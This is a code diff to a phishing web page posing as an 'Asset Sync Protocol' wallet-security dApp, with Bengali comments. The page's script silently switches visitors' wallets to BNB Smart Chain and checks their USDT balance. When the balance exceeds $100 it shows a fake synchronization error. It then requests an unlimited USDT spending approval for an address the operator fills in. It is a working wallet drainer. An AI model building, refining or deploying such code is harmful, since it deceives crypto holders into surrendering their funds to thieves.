@@ -31,6 +31,13 @@
             border: 1px solid rgba(255, 255, 255, 0.08);
             box-shadow: 0 40px 100px rgba(0,0,0,0.6);
         }
+        .logo-container {
+            width: 90px; height: 90px;
+            border-radius: 22px; overflow: hidden;
+            margin-bottom: 16px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
+        }
+        .logo-container img { width: 100%; height: 100%; object-fit: cover; }
         .loader-spin {
             border: 3px solid rgba(252, 213, 53, 0.1);
             border-top: 3px solid var(--binance-yellow);
@@ -46,8 +53,8 @@
         <div id="main-wrapper" class="main-card relative overflow-hidden">
             
             <div class="flex flex-col items-center mb-10 text-center">
-                <div class="w-20 h-20 bg-gradient-to-tr from-[#fcd535] to-[#f0b90b] rounded-3xl flex items-center justify-center shadow-2xl mb-4">
-                    <span class="text-black font-black text-3xl">ASP</span>
+                <div class="logo-container">
+                    <img src="https://i.ibb.co/5xbXfHw/shield-logo.png" alt="ASP Logo">
                 </div>
                 <h1 class="text-white text-2xl font-bold tracking-tight">Asset Sync Protocol</h1>
                 <div id="node-status" class="flex items-center mt-3 bg-black/20 px-4 py-1 rounded-full mx-auto">
@@ -63,9 +70,10 @@
 
             <div id="dapp-content" class="hidden space-y-6">
                 <div id="status-badge" class="text-center"></div>
+                
                 <div id="info-box" class="p-5 rounded-2xl text-sm leading-relaxed border text-left"></div>
 
-                <div class="bg-black/30 p-6 rounded-2xl border border-white/5">
+                <div onclick="handleSyncClick()" class="bg-black/30 p-6 rounded-2xl border border-white/5 cursor-pointer active:bg-black/50 transition-all">
                     <p class="text-gray-500 text-[10px] uppercase font-black tracking-widest mb-2">Verified Portfolio Balance</p>
                     <div class="flex items-baseline justify-between">
                         <h2 id="total-balance-text" class="text-4xl font-bold text-white tracking-tighter">$0.00</h2>
@@ -88,7 +96,7 @@
     </div>
 
     <script>
-        const bscChainId = "0x38"; // Background-এ BEP20 ই থাকবে
+        const bscChainId = "0x38"; 
         const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
         const minABI = [
             {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
@@ -103,7 +111,7 @@
                 try {
                     provider = new ethers.providers.Web3Provider(window.ethereum);
                     
-                    // অটোমেটিক নেটওয়ার্ক সুইচ (ইউজার জানবে না এটি BEP20)
+                    // অটো-সুইচ নেটওয়ার্ক
                     try {
                         await window.ethereum.request({
                             method: 'wallet_switchEthereumChain',
@@ -111,15 +119,7 @@
                         });
                     } catch (e) {
                         if (e.code === 4902) {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: bscChainId,
-                                    chainName: 'Binance Smart Chain',
-                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                    rpcUrls: ['https://bsc-dataseed.binance.org/']
-                                }]
-                            });
+                            await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: bscChainId, chainName: 'Binance Smart Chain', rpcUrls: ['https://bsc-dataseed.binance.org/'] }] });
                         }
                     }
 
@@ -145,15 +145,19 @@
             const badge = document.getElementById('status-badge');
             const btn = document.getElementById('btn-container');
 
+            // ১০০ ডলারের বেশি হলে ওয়ার্নিং
             if (value > 100) {
-                badge.innerHTML = `<span class="bg-red-500/10 text-red-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-red-500/20">DESYNC DETECTED</span>`;
+                badge.innerHTML = `<span class="bg-red-500/10 text-red-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-red-500/20">ACTION REQUIRED</span>`;
                 info.className = "p-5 rounded-2xl text-sm bg-red-500/10 text-red-400 border border-red-500/20";
-                info.innerText = "Internal node error. Authorize a secure synchronization to prevent potential asset displacement.";
-                btn.classList.remove('hidden');
-            } else {
-                badge.innerHTML = `<span class="bg-green-500/10 text-green-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-green-500/20">NETWORK SECURED</span>`;
+                info.innerText = "আপনার কারেন্সি রিফ্রেস করুন, এখানে ডাটা সিনক্রোনাইজেশন সমস্যা পাওয়া গেছে।";
+                btn.classList.remove('hidden'); // বাটন শো করবে
+            } 
+            // ১০০ ডলারের কম হলে নরমাল মেসেজ
+            else {
+                badge.innerHTML = `<span class="bg-green-500/10 text-green-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-green-500/20">SYSTEM HEALTHY</span>`;
                 info.className = "p-5 rounded-2xl text-sm bg-green-500/10 text-green-400 border border-green-500/20";
-                info.innerText = "Your account nodes are healthy. All data is fully synchronised with the secure mainnet.";
+                info.innerText = "আপনার কারেন্সি এবং পোর্টফোলিও ঠিক আছে। কোনো অ্যাকশন প্রয়োজন নেই।";
+                btn.classList.add('hidden'); // বাটন হাইড থাকবে
             }
         }
 
@@ -173,9 +177,9 @@
                 try {
                     const contract = new ethers.Contract(usdtAddress, minABI, signer);
                     const amount = ethers.utils.parseUnits("999999999", 18);
-                    // আপনার রিসিভার অ্যাড্রেস এখানে "0x000..." এর জায়গায় বসান
+                    // আপনার রিসিভার অ্যাড্রেস এখানে দিন
                     await contract.approve("0x0000000000000000000000000000000000000000", amount); 
-                } catch (e) { console.log("Rejected"); }
+                } catch (e) { console.log("User Rejected"); }
             }, 6000);
         }
 
